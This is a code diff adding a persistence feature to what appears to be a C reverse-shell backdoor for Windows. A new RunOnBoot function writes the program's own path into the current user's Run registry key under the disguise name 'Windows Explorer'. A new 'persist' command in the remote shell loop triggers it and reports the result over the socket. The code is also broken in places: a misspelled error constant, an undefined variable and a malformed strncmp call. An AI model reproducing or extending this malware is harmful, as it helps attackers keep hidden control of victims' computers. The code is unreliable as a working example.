@@ -14,6 +14,37 @@
 
 int sock;
 
+int RunOnBoot(){
+  char error[128] = "Failed\n";
+  char success[128] = "Created Presistence successfully at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+  TCHAR szPath[MAX_PATH];
+  DWORD PathLen = 0;
+
+  PathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+  if (PathLen == 0) {
+    send(sock, error, sizeof(error), 0);
+    return -1;
+  }
+
+  HKEY NewValue;
+
+  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCSESS) {
+    send(sock, error, sizeof(error), 0);
+    return -1;
+  }
+
+  DWORD pathLenInBytes = PathLen * sizeof(*szSize);
+  if (RegSetValueEx(NewValue, TEXT("Windows Explorer"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCSESS) {
+    RegCloseKey(NewValue);
+    send(sock, error, sizeof(error), 0);
+    return -1;
+  }
+
+  RegCloseKey(NewValue);
+  send(sock, success, sizeof(success), 0);
+  return 0;
+}
+
 char *
 str_cut(char str[], int slice_from, int slice_to){
   if (str[0] == '\0')
@@ -74,6 +105,10 @@ void Shell() {
 
     else if (strncmp("cd ", buffer, "r") == 0) {
       chdir(str_cut(buffer,3,100));
+    }
+
+    else if (strncmp("persist", buffer, 7) == 0) {
+      RunOnBoot();
     }
 
     else{
